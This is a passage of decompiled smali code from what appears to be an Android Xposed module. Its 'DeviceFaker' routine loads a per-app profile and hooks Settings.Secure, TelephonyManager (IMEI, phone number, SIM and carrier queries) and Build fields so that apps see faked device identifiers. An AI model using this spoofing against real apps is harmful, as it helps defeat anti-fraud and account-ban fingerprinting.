    invoke-static {v1, v0, v2}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    .line 625
    :try_start_1
    const-string v1, "android.database.AbstractCursor"

    iget-object v2, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    .line 626
    invoke-static {v1, v2}, Lde/robv/android/xposed/XposedHelpers;->findClass(Ljava/lang/String;Ljava/lang/ClassLoader;)Ljava/lang/Class;

    move-result-object v1

    new-instance v2, Lcom/rebel/module/XposedHook$8;

    invoke-direct {v2, p0}, Lcom/rebel/module/XposedHook$8;-><init>(Lcom/rebel/module/XposedHook;)V

    .line 625
    invoke-static {v1, v0, v2}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 664
    goto :goto_0

    .line 663
    :catchall_0
    move-exception v0

    .line 671
    :goto_0
    goto :goto_1

    .line 668
    :catchall_1
    move-exception v0

    .line 672
    :goto_1
    return-void
.end method

.method private hookDeviceFaker(Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;)V
    .locals 24
    .param p1, "lpparam"    # Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;

    .line 1667
    move-object/from16 v1, p0

    move-object/from16 v2, p1

    const-string v3, "call"

    const-string v4, "getId"

    const-string v5, "android.webkit.WebSettings"

    const-string v6, "DeviceFaker: \u2717 MediaDrm hook failed: "

    const-string v7, "ro.product."

    const-string v8, "getPropertyByteArray"

    const-string v9, "DeviceFaker: \u2713 Hooked "

    const-string v10, "android.provider.Settings$Secure"

    const-string v0, "/data/local/tmp/src_device_faker.json"

    const-string v11, "query"

    const-string v12, "android.content.ContentResolver"

    const-string v13, "android.media.MediaDrm"

    const-string v14, "getString"

    :try_start_0
    new-instance v15, Ljava/io/File;

    invoke-direct {v15, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 1668
    .local v15, "fakerFile":Ljava/io/File;
    move-object/from16 v16, v15

    .end local v15    # "fakerFile":Ljava/io/File;
    .local v16, "fakerFile":Ljava/io/File;
    new-instance v15, Ljava/lang/StringBuilder;

    invoke-direct {v15}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v17, v11

    const-string v11, "DeviceFaker: Config file check for "

    invoke-virtual {v15, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    iget-object v15, v2, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->packageName:Ljava/lang/String;

    invoke-virtual {v11, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    const-string v15, " \u2014 exists="

    invoke-virtual {v11, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    .line 1669
    invoke-virtual/range {v16 .. v16}, Ljava/io/File;->exists()Z

    move-result v15

    invoke-virtual {v11, v15}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v11

    const-string v15, " canRead="

    invoke-virtual {v11, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    .line 1670
    invoke-virtual/range {v16 .. v16}, Ljava/io/File;->canRead()Z

    move-result v15

    invoke-virtual {v11, v15}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v11

    const-string v15, " length="

    invoke-virtual {v11, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    .line 1671
    invoke-virtual/range {v16 .. v16}, Ljava/io/File;->exists()Z

    move-result v15

    if-eqz v15, :cond_0

    invoke-virtual/range {v16 .. v16}, Ljava/io/File;->length()J

    move-result-wide v18

    goto :goto_0

    :cond_0
    const-wide/16 v18, -0x1

    :goto_0
    move-object v15, v3

    move-object/from16 v20, v4

    move-wide/from16 v3, v18

    invoke-virtual {v11, v3, v4}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 1668
    invoke-static {v3}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V

    .line 1674
    iget-object v3, v2, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->packageName:Ljava/lang/String;

    .line 1675
    invoke-static {v3}, Lcom/rebel/module/DeviceFakerManager;->readProfileForPackage(Ljava/lang/String;)Lcom/rebel/module/DeviceFakerManager$DeviceProfile;

    move-result-object v3

    .line 1676
    .local v3, "profile":Lcom/rebel/module/DeviceFakerManager$DeviceProfile;
    if-nez v3, :cond_2

    .line 1677
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "DeviceFaker: No profile for "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    iget-object v5, v2, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->packageName:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, " (disabled or not set)"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_20

    .line 1680
    :try_start_1
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v4

    const/4 v5, 0x2

    new-array v5, v5, [Ljava/lang/String;

    const-string v6, "cat"

    const/4 v7, 0x0

    aput-object v6, v5, v7

    const/4 v6, 0x1

    aput-object v0, v5, v6

    .line 1681
    invoke-virtual {v4, v5}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v0

    .line 1682
    .local v0, "p":Ljava/lang/Process;
    new-instance v4, Ljava/io/BufferedReader;

    new-instance v5, Ljava/io/InputStreamReader;

    .line 1683
    invoke-virtual {v0}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v4, v5}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 1684
    .local v4, "br":Ljava/io/BufferedReader;
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    .line 1686
    .local v5, "sb":Ljava/lang/StringBuilder;
    :goto_1
    invoke-virtual {v4}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v6

    move-object v7, v6

    .local v7, "line":Ljava/lang/String;
    if-eqz v6, :cond_1

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->length()I

    move-result v6

    const/16 v8, 0x1f4

    if-ge v6, v8, :cond_1

    .line 1687
    invoke-virtual {v5, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v8, "\n"

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_1

    .line 1689
    :cond_1
    invoke-virtual {v4}, Ljava/io/BufferedReader;->close()V

    .line 1690
    invoke-virtual {v0}, Ljava/lang/Process;->destroy()V

    .line 1691
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "DeviceFaker: File content via cat (first 500 chars): "

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_20

    .line 1694
    .end local v0    # "p":Ljava/lang/Process;
    .end local v4    # "br":Ljava/io/BufferedReader;
    .end local v5    # "sb":Ljava/lang/StringBuilder;
    .end local v7    # "line":Ljava/lang/String;
    goto :goto_2

    .line 1692
    :catch_0
    move-exception v0

    .line 1693
    .local v0, "ex":Ljava/lang/Exception;
    :try_start_2
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "DeviceFaker: cat also failed: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V

    .line 1695
    .end local v0    # "ex":Ljava/lang/Exception;
    :goto_2
    return-void

    .line 1697
    :cond_2
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "DeviceFaker: \u2713 Profile FOUND for "

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v4, v2, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->packageName:Ljava/lang/String;

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v4, " \u2014 installing hooks"

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V

    .line 1698
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "DeviceFaker: androidId="

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v4, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->androidId:Ljava/lang/String;

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v4, ", model="

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v4, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->model:Ljava/lang/String;

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v4, ", manufacturer="

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v4, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->manufacturer:Ljava/lang/String;

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v4, ", imei="

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v4, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->imei:Ljava/lang/String;

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_20

    .line 1703
    :try_start_3
    iget-object v0, v2, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    const-class v4, Landroid/content/ContentResolver;

    const-class v11, Ljava/lang/String;
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    move-object/from16 v18, v15

    :try_start_4
    new-instance v15, Lcom/rebel/module/XposedHook$14;

    invoke-direct {v15, v1, v3}, Lcom/rebel/module/XposedHook$14;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    filled-new-array {v4, v11, v15}, [Ljava/lang/Object;

    move-result-object v4

    invoke-static {v10, v0, v14, v4}, Lde/robv/android/xposed/XposedHelpers;->findAndHookMethod(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/String;[Ljava/lang/Object;)Lde/robv/android/xposed/XC_MethodHook$Unhook;

    .line 1717
    const-string v0, "DeviceFaker: \u2713 Hooked Settings.Secure.getString"

    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    .line 1720
    goto :goto_4

    .line 1718
    :catchall_0
    move-exception v0

    goto :goto_3

    :catchall_1
    move-exception v0

    move-object/from16 v18, v15

    .line 1719
    .local v0, "t":Ljava/lang/Throwable;
    :goto_3
    :try_start_5
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v11, "DeviceFaker: \u2717 Settings.Secure.getString hook failed: "

    invoke-virtual {v4, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v4, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_20

    .line 1724
    .end local v0    # "t":Ljava/lang/Throwable;
    :goto_4
    :try_start_6
    iget-object v0, v2, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    const-string v4, "getStringForUser"

    const-class v11, Landroid/content/ContentResolver;

    const-class v15, Ljava/lang/String;
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_4

    move-object/from16 v19, v14

    :try_start_7
    sget-object v14, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_3

    move-object/from16 v21, v12

    :try_start_8
    new-instance v12, Lcom/rebel/module/XposedHook$15;

    invoke-direct {v12, v1, v3}, Lcom/rebel/module/XposedHook$15;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    filled-new-array {v11, v15, v14, v12}, [Ljava/lang/Object;

    move-result-object v11

    invoke-static {v10, v0, v4, v11}, Lde/robv/android/xposed/XposedHelpers;->findAndHookMethod(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/String;[Ljava/lang/Object;)Lde/robv/android/xposed/XC_MethodHook$Unhook;

    .line 1736
    const-string v0, "DeviceFaker: \u2713 Hooked Settings.Secure.getStringForUser"

    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_2

    .line 1739
    goto :goto_5

    .line 1737
    :catchall_2
    move-exception v0

    goto :goto_5

    :catchall_3
    move-exception v0

    move-object/from16 v21, v12

    goto :goto_5

    :catchall_4
    move-exception v0

    move-object/from16 v21, v12

    move-object/from16 v19, v14

    .line 1743
    :goto_5
    :try_start_9
    const-string v0, "android.telephony.TelephonyManager"

    iget-object v4, v2, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    invoke-static {v0, v4}, Lde/robv/android/xposed/XposedHelpers;->findClass(Ljava/lang/String;Ljava/lang/ClassLoader;)Ljava/lang/Class;

    move-result-object v0

    move-object v4, v0

    .line 1745
    .local v4, "tmClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    const/4 v0, 0x0

    .line 1747
    .local v0, "hookCount":I
    const-string v10, "getDeviceId"

    new-instance v11, Lcom/rebel/module/XposedHook$16;

    invoke-direct {v11, v1, v3}, Lcom/rebel/module/XposedHook$16;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    invoke-static {v4, v10, v11}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;

    move-result-object v10

    .line 1753
    invoke-interface {v10}, Ljava/util/Set;->size()I

    move-result v10

    add-int/2addr v0, v10

    .line 1754
    const-string v10, "getImei"

    new-instance v11, Lcom/rebel/module/XposedHook$17;

    invoke-direct {v11, v1, v3}, Lcom/rebel/module/XposedHook$17;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    invoke-static {v4, v10, v11}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;

    move-result-object v10

    .line 1760
    invoke-interface {v10}, Ljava/util/Set;->size()I

    move-result v10

    add-int/2addr v0, v10

    .line 1761
    const-string v10, "getMeid"

    new-instance v11, Lcom/rebel/module/XposedHook$18;

    invoke-direct {v11, v1, v3}, Lcom/rebel/module/XposedHook$18;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    invoke-static {v4, v10, v11}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;

    move-result-object v10

    .line 1767
    invoke-interface {v10}, Ljava/util/Set;->size()I

    move-result v10

    add-int/2addr v0, v10

    .line 1768
    const-string v10, "getLine1Number"

    new-instance v11, Lcom/rebel/module/XposedHook$19;

    invoke-direct {v11, v1, v3}, Lcom/rebel/module/XposedHook$19;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    invoke-static {v4, v10, v11}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;

    move-result-object v10

    .line 1774
    invoke-interface {v10}, Ljava/util/Set;->size()I

    move-result v10

    add-int/2addr v0, v10

    .line 1775
    const-string v10, "getNetworkOperator"

    new-instance v11, Lcom/rebel/module/XposedHook$20;

    invoke-direct {v11, v1, v3}, Lcom/rebel/module/XposedHook$20;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    invoke-static {v4, v10, v11}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;

    move-result-object v10

    .line 1781
    invoke-interface {v10}, Ljava/util/Set;->size()I

    move-result v10

    add-int/2addr v0, v10

    .line 1782
    const-string v10, "getNetworkOperatorName"

    new-instance v11, Lcom/rebel/module/XposedHook$21;

    invoke-direct {v11, v1, v3}, Lcom/rebel/module/XposedHook$21;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    invoke-static {v4, v10, v11}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;

    move-result-object v10

    .line 1788
    invoke-interface {v10}, Ljava/util/Set;->size()I

    move-result v10

    add-int/2addr v0, v10

    .line 1789
    const-string v10, "getSimOperator"

    new-instance v11, Lcom/rebel/module/XposedHook$22;

    invoke-direct {v11, v1, v3}, Lcom/rebel/module/XposedHook$22;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    invoke-static {v4, v10, v11}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;

    move-result-object v10

    .line 1795
    invoke-interface {v10}, Ljava/util/Set;->size()I

    move-result v10

    add-int/2addr v0, v10

    .line 1796
    const-string v10, "getSimOperatorName"

    new-instance v11, Lcom/rebel/module/XposedHook$23;

    invoke-direct {v11, v1, v3}, Lcom/rebel/module/XposedHook$23;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    invoke-static {v4, v10, v11}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;

    move-result-object v10

    .line 1802
    invoke-interface {v10}, Ljava/util/Set;->size()I

    move-result v10

    add-int/2addr v0, v10

    .line 1803
    const-string v10, "getSimSerialNumber"

    new-instance v11, Lcom/rebel/module/XposedHook$24;

    invoke-direct {v11, v1, v3}, Lcom/rebel/module/XposedHook$24;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    invoke-static {v4, v10, v11}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;

    move-result-object v10

    .line 1809
    invoke-interface {v10}, Ljava/util/Set;->size()I

    move-result v10

    add-int/2addr v0, v10

    .line 1810
    const-string v10, "getSubscriberId"

    new-instance v11, Lcom/rebel/module/XposedHook$25;

    invoke-direct {v11, v1, v3}, Lcom/rebel/module/XposedHook$25;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    invoke-static {v4, v10, v11}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;

    move-result-object v10

    .line 1816
    invoke-interface {v10}, Ljava/util/Set;->size()I

    move-result v10

    add-int/2addr v0, v10

    .line 1817
    const-string v10, "getVoiceMailNumber"

    new-instance v11, Lcom/rebel/module/XposedHook$26;

    invoke-direct {v11, v1, v3}, Lcom/rebel/module/XposedHook$26;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    invoke-static {v4, v10, v11}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;

    move-result-object v10

    .line 1823
    invoke-interface {v10}, Ljava/util/Set;->size()I

    move-result v10
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_7

    add-int/2addr v10, v0

    .line 1825
    .end local v0    # "hookCount":I
    .local v10, "hookCount":I
    :try_start_a
    const-string v0, "getTypeAllocationCode"

    new-instance v11, Lcom/rebel/module/XposedHook$27;

    invoke-direct {v11, v1, v3}, Lcom/rebel/module/XposedHook$27;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    invoke-static {v4, v0, v11}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;

    move-result-object v0

    .line 1831
    invoke-interface {v0}, Ljava/util/Set;->size()I

    move-result v0
    :try_end_a
    .catchall {:try_start_a .. :try_end_a} :catchall_5

    add-int/2addr v10, v0

    .line 1833
    goto :goto_6

    .line 1832
    :catchall_5
    move-exception v0

    .line 1835
    :goto_6
    :try_start_b
    const-string v0, "getManufacturerCode"

    new-instance v11, Lcom/rebel/module/XposedHook$28;

    invoke-direct {v11, v1, v3}, Lcom/rebel/module/XposedHook$28;-><init>(Lcom/rebel/module/XposedHook;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    invoke-static {v4, v0, v11}, Lde/robv/android/xposed/XposedBridge;->hookAllMethods(Ljava/lang/Class;Ljava/lang/String;Lde/robv/android/xposed/XC_MethodHook;)Ljava/util/Set;

    move-result-object v0

    .line 1841
    invoke-interface {v0}, Ljava/util/Set;->size()I

    move-result v0
    :try_end_b
    .catchall {:try_start_b .. :try_end_b} :catchall_6

    add-int/2addr v10, v0

    .line 1843
    goto :goto_7

    .line 1842
    :catchall_6
    move-exception v0

    .line 1845
    :goto_7
    :try_start_c
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v10}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v11, " TelephonyManager methods"

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_c
    .catchall {:try_start_c .. :try_end_c} :catchall_7

    .line 1848
    .end local v4    # "tmClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    .end local v10    # "hookCount":I
    goto :goto_8

    .line 1846
    :catchall_7
    move-exception v0

    .line 1847
    .local v0, "t":Ljava/lang/Throwable;
    :try_start_d
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "DeviceFaker: \u2717 TelephonyManager hooks failed: "

    invoke-virtual {v4, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v4, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_d
    .catchall {:try_start_d .. :try_end_d} :catchall_20

    .line 1853
    .end local v0    # "t":Ljava/lang/Throwable;
    :goto_8
    :try_start_e
    iget-object v0, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->manufacturer:Ljava/lang/String;

    if-eqz v0, :cond_3

    .line 1854
    const-class v0, Landroid/os/Build;

    const-string v4, "MANUFACTURER"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->manufacturer:Ljava/lang/String;

    invoke-static {v0, v4, v10}, Lde/robv/android/xposed/XposedHelpers;->setStaticObjectField(Ljava/lang/Class;Ljava/lang/String;Ljava/lang/Object;)V

    .line 1855
    :cond_3
    iget-object v0, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->model:Ljava/lang/String;

    if-eqz v0, :cond_4

    .line 1856
    const-class v0, Landroid/os/Build;

    const-string v4, "MODEL"

    iget-object v10, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->model:Ljava/lang/String;

    invoke-static {v0, v4, v10}, Lde/robv/android/xposed/XposedHelpers;->setStaticObjectField(Ljava/lang/Class;Ljava/lang/String;Ljava/lang/Object;)V

    .line 1857
    :cond_4
    iget-object v0, v3, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->brand:Ljava/lang/String;

    if-eqz v0, :cond_5

    .line 1858
    const-class v0, Landroid/os/Build;

    const-string v4, "BRAND"

